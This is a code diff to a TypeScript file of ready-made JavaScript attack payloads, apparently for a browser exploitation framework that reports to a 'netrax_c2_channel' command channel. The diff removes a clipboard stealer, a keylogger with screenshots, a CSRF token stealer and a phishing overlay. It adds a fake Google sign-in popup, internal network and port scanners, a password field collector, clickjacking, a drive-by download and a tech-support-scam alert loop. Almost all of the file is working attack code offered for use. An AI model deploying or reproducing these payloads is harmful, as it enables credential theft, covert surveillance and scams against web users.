@@ -1,3 +1,4 @@
+
 import type { JsPayload } from '@/components/javascript-library';
 
 export const PREMADE_PAYLOADS: JsPayload[] = [
@@ -69,23 +70,6 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
 `.trim(),
     },
     {
-        name: "Clipboard Stealer",
-        description: "Reads the content of the user's clipboard when they paste into the page.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-    document.addEventListener('paste', async (e) => {
-        const text = await navigator.clipboard.readText();
-        channel.postMessage({
-            sessionId: sessionId, type: 'clipboard-read', data: { pastedText: text },
-            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-        });
-    }, true);
-})();
-`.trim(),
-    },
-    {
         name: "WebRTC IP Leak",
         description: "Attempts to discover the user's local IP address using WebRTC.",
         code: `
@@ -129,154 +113,6 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         },
         timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
     });
-})();
-`.trim(),
-    },
-    {
-        name: "Keylogger + Screenshot Combo",
-        description: "Captures keystrokes and periodically sends screenshots of the page.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-
-    document.addEventListener('keydown', (e) => {
-        channel.postMessage({
-            sessionId: sessionId, type: 'keystroke',
-            data: { key: e.key },
-            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-        });
-    });
-
-    setInterval(() => {
-        try {
-            const canvas = document.createElement('canvas');
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            const ctx = canvas.getContext('2d');
-            if (ctx) {
-                ctx.drawWindow(window, 0, 0, window.innerWidth, window.innerHeight, 'rgb(255,255,255)');
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.5);
-                 channel.postMessage({
-                    sessionId: sessionId, type: 'screenshot',
-                    data: { screenshot: dataUrl },
-                    timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-                });
-            }
-        } catch(e) { /* html2canvas might be better but is a large dependency */ }
-    }, 10000); // Screenshot every 10 seconds
-})();
-`.trim(),
-    },
-    {
-        name: "Beacon Tracker Ping",
-        description: "Sends a simple 'ping' to the C2 channel, confirming the user is active on the page.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-    channel.postMessage({
-        sessionId: sessionId, type: 'beacon-ping',
-        data: { message: 'User is active.' },
-        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-    });
-})();
-`.trim(),
-    },
-    {
-        name: "CSRF Token Stealer",
-        description: "Searches the DOM for common CSRF token patterns and exfiltrates the value.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-    const tokenEl = document.querySelector('input[name=csrf_token], input[name=__RequestVerificationToken], meta[name=csrf-token]');
-    if (tokenEl) {
-        const token = tokenEl.value || tokenEl.content;
-        channel.postMessage({
-            sessionId: sessionId, type: 'csrf-token',
-            data: { tokenName: tokenEl.name || 'meta-tag', tokenValue: token },
-            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-        });
-    }
-})();
-`.trim(),
-    },
-    {
-        name: "Phishing Overlay Injector",
-        description: "Injects a fake 'session expired' login form over the entire page.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-
-    const overlay = document.createElement('div');
-    overlay.style = 'position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;background:rgba(0,0,0,0.8);display:flex;justify-content:center;align-items:center;';
-    overlay.innerHTML = \`<div style="background:white;padding:2rem;border-radius:8px;text-align:center;">
-        <h3>Session Expired</h3>
-        <p>Please log in again to continue.</p>
-        <form id="phish-form" style="display:flex;flex-direction:column;gap:1rem;margin-top:1rem;">
-            <input name="username" placeholder="Username" style="padding:0.5rem;border:1px solid #ccc;border-radius:4px;">
-            <input name="password" type="password" placeholder="Password" style="padding:0.5rem;border:1px solid #ccc;border-radius:4px;">
-            <button type="submit" style="padding:0.5rem;background:#333;color:white;border:none;border-radius:4px;cursor:pointer;">Login</button>
-        </form>
-    </div>\`;
-    document.body.appendChild(overlay);
-
-    document.getElementById('phish-form').addEventListener('submit', (e) => {
-        e.preventDefault();
-        const formData = new FormData(e.target);
-        const data = Object.fromEntries(formData.entries());
-        channel.postMessage({
-            sessionId: sessionId, type: 'phishing-overlay-submit', data: { data },
-            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-        });
-        overlay.innerHTML = '<h3 style="color:white;">Thank you. Your session has been restored.</h3>';
-        setTimeout(() => overlay.remove(), 2000);
-    });
-})();
-`.trim(),
-    },
-    {
-        name: "Browser Fingerprinter",
-        description: "Collects detailed browser and device characteristics to uniquely identify the user's system.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-    const fingerprint = {
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        platform: navigator.platform,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        screenResolution: screen.width + 'x' + screen.height,
-        colorDepth: screen.colorDepth,
-        timezoneOffset: new Date().getTimezoneOffset(),
-        plugins: Array.from(navigator.plugins).map(p => p.name)
-    };
-    channel.postMessage({
-        sessionId: sessionId, type: 'fingerprint',
-        data: fingerprint,
-        timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-    });
-})();
-`.trim(),
-    },
-    {
-        name: "Click Logger",
-        description: "Logs every click on the page, including coordinates and the clicked element.",
-        code: `
-(function() {
-    const channel = new BroadcastChannel('netrax_c2_channel');
-    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
-     document.addEventListener('click', (e) => {
-        channel.postMessage({
-            sessionId: sessionId, type: 'click', 
-            data: { x: e.clientX, y: e.clientY, target: e.target.innerText ? e.target.innerText.substring(0, 50) : e.target.tagName },
-            timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent
-        });
-    }, true);
 })();
 `.trim(),
     },
@@ -442,7 +278,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
         recorder.onstop = async () => {
             const blob = new Blob(recordedChunks, { type: mimeType });
             const dataUrl = await blobToDataURL(blob);
-            exfiltrate('media-stream', { type: mimeType, dataUrl });
+            exfiltrate('media-stream', { type: mimeType, dataUrl, size: blob.size });
             recordedChunks = [];
         };
         return recorder;
@@ -481,7 +317,7 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
                     const imageCapture = new ImageCapture(videoTrack);
                     const blob = await imageCapture.takePhoto();
                     const dataUrl = await blobToDataURL(blob);
-                    exfiltrate('media-stream', { type: 'image/png', dataUrl });
+                    exfiltrate('media-stream', { type: 'image/png', dataUrl, size: blob.size });
                 }
                 break;
             case 'start-video-record':
@@ -506,6 +342,262 @@ export const PREMADE_PAYLOADS: JsPayload[] = [
     });
 
     exfiltrate('connection', { message: 'Device Access Payload loaded.' });
+})();
+`.trim(),
+    },
+    {
+        name: "Browser-in-the-Browser (BitB) Attack",
+        description: "Simulates a fake login popup (e.g., 'Sign in with Google') to hijack credentials.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    const modalHTML = \`
+        <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+            <div style="background: white; width: 450px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.2); font-family: 'Roboto', sans-serif;">
+                <div style="padding: 16px; border-bottom: 1px solid #e0e0e0;">
+                    <h1 style="font-size: 16px; font-weight: 500; color: #202124; margin: 0;">Sign in</h1>
+                    <p style="font-size: 14px; color: #5f6368; margin: 4px 0 0;">to continue to Drive</p>
+                </div>
+                <div style="padding: 24px;">
+                    <form id="bitb-form">
+                        <input name="email" type="email" placeholder="Email or phone" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 16px;">
+                        <input name="password" type="password" placeholder="Password" style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px; margin-bottom: 16px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center;">
+                            <a href="#" style="font-size: 14px; color: #1a73e8; text-decoration: none;">Forgot password?</a>
+                            <button type="submit" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer;">Next</button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    \`;
+
+    const overlay = document.createElement('div');
+    overlay.innerHTML = modalHTML;
+    document.body.appendChild(overlay);
+
+    document.getElementById('bitb-form').addEventListener('submit', e => {
+        e.preventDefault();
+        const formData = new FormData(e.target);
+        const data = Object.fromEntries(formData.entries());
+        exfiltrate('bitb-submit', { data });
+        overlay.innerHTML = '<div style="background:white;padding:2rem;border-radius:8px;text-align:center;"><h3>Login Successful!</h3></div>';
+        setTimeout(() => overlay.remove(), 2000);
+    });
+})();
+`.trim(),
+    },
+    {
+        name: "Internal Network Scanner",
+        description: "Scans for common internal network IP addresses to identify potential devices.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    const ipsToScan = ['192.168.1.1', '192.168.0.1', '10.0.0.1'];
+    ipsToScan.forEach(ip => {
+        const img = new Image();
+        img.src = \`http://\${ip}\`;
+        img.onload = () => exfiltrate('internal-ip-found', { ip });
+        img.onerror = () => { /* Do nothing on error */ };
+    });
+})();
+`.trim(),
+    },
+    {
+        name: "Port Scanner",
+        description: "Performs a timing-based scan to infer open ports on a target.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    const target = prompt("Enter target IP or domain to scan:");
+    if (!target) return;
+    
+    const portsToScan = [22, 80, 443, 3306, 8080];
+    portsToScan.forEach(port => {
+        const startTime = Date.now();
+        const img = new Image();
+        img.onerror = () => {
+            const endTime = Date.now();
+            if (endTime - startTime < 1500) { // Fast error often means port is open but service isn't HTTP
+                exfiltrate('port-scan-result', { target, port });
+            }
+        };
+        img.src = \`http://\${target}:\${port}\`;
+    });
+})();
+`.trim(),
+    },
+    {
+        name: "Clipboard Hijacker",
+        description: "Steals clipboard content on paste and can optionally overwrite it.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    const attackerContent = "ATTACKER_CONTROLLED_CONTENT";
+    // navigator.clipboard.writeText(attackerContent); // Uncomment to overwrite clipboard
+
+    document.addEventListener('paste', async (e) => {
+        const text = await navigator.clipboard.readText();
+        exfiltrate('clipboard-read', { pastedText: text });
+    }, true);
+})();
+`.trim(),
+    },
+    {
+        name: "Drive-by Download",
+        description: "Forces the browser to download a file created from a Blob.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+    
+    const filename = "important_document.txt";
+    const blob = new Blob(["This is the content of the malicious file."], { type: 'text/plain' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    exfiltrate('drive-by-download', { filename });
+})();
+`.trim(),
+    },
+    {
+        name: "Fake System Alert / Tab Trap",
+        description: "Simulates a tech support scam by trapping the user in alert loops.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    exfiltrate('popup-scam', { status: 'started' });
+    let i = 0;
+    while(i < 10) { // Loop to make it harder to close tab
+        alert("CRITICAL SECURITY ALERT: Your system is infected with spyware! Call support at 1-800-FAKE-NUM immediately.");
+        i++;
+    }
+})();
+`.trim(),
+    },
+    {
+        name: "Clickjacking Overlay",
+        description: "Creates an invisible iframe to hijack user clicks.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+    const urlToJack = prompt("Enter URL to hijack clicks for (e.g., a vulnerable action page):");
+    if (!urlToJack) return;
+
+    const iframe = document.createElement('iframe');
+    iframe.src = urlToJack;
+    iframe.style = "position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;opacity:0.01;";
+    document.body.appendChild(iframe);
+    exfiltrate('clickjack', { url: urlToJack });
+})();
+`.trim(),
+    },
+    {
+        name: "Persistent Loader (localStorage)",
+        description: "Injects a script from localStorage on every page load.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+    
+    const maliciousScript = "alert('Persistent XSS via localStorage!');";
+    localStorage.setItem('persistent_payload', maliciousScript);
+
+    // This part would need to be on the page already to load the stored script
+    // const storedPayload = localStorage.getItem('persistent_payload');
+    // if(storedPayload) { eval(storedPayload); }
+
+    exfiltrate('persistent-loader', { storage: 'localStorage' });
+})();
+`.trim(),
+    },
+    {
+        name: "Behavioral Biometrics",
+        description: "Collects mouse movement and typing patterns.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    let mousePath = [];
+    document.addEventListener('mousemove', e => {
+        mousePath.push({x: e.clientX, y: e.clientY, t: Date.now()});
+        if (mousePath.length > 50) {
+            exfiltrate('behavioral-biometrics', { type: 'mouse-path', data: mousePath });
+            mousePath = [];
+        }
+    });
+
+    let lastKeydown = 0;
+    document.addEventListener('keydown', e => {
+        if(lastKeydown > 0) {
+            const dwellTime = Date.now() - lastKeydown;
+            exfiltrate('behavioral-biometrics', { type: 'typing-speed', key: e.key, dwell: dwellTime });
+        }
+        lastKeydown = Date.now();
+    });
+})();
+`.trim(),
+    },
+    {
+        name: "Password Field Collector",
+        description: "Specifically targets password fields to capture credentials as they are typed.",
+        code: `
+(function() {
+    const channel = new BroadcastChannel('netrax_c2_channel');
+    const sessionId = 'session-' + Date.now() + '-' + Math.random().toString(36).substring(2, 9);
+    function exfiltrate(type, data) {
+        channel.postMessage({ sessionId, type, data, timestamp: new Date().toISOString(), url: window.location.href, userAgent: navigator.userAgent });
+    }
+
+    document.querySelectorAll('input[type=password]').forEach(el => {
+        el.addEventListener('blur', e => {
+            if(e.target.value) {
+                exfiltrate('password-field-capture', { name: e.target.name || e.target.id, value: e.target.value });
+            }
+        });
+    });
 })();
 `.trim(),
     }
